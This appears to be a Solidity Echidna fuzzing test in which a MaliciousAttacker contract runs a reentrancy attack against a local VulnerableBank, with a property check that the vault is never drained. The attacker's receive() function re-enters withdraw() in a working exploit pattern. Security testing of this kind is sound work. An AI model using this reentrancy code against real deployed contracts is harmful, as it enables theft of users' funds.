pragma solidity ^0.8.13;

import "../contracts/VulnerableBank.sol";

contract MaliciousAttacker {
    VulnerableBank public target;

    constructor(VulnerableBank _target) {
        target = _target;
    }

    receive() external payable {
        if (address(target).balance >= msg.value) {
            target.withdraw(); 
        }
    }

    function attack() public payable {
        
        uint256 amount = 1 ether; 
        if(address(this).balance >= amount) {
            target.deposit{value: amount}();
            target.withdraw();
        }
    }
}

contract ReentrancyEchidnaTest is MaliciousAttacker {
    constructor() MaliciousAttacker(new VulnerableBank()) payable {
        target.deposit{value: 10 ether}();
    }

    function echidna_test_vault_never_drained() public view returns (bool) {
        return address(target).balance >= 10 ether;
    }
}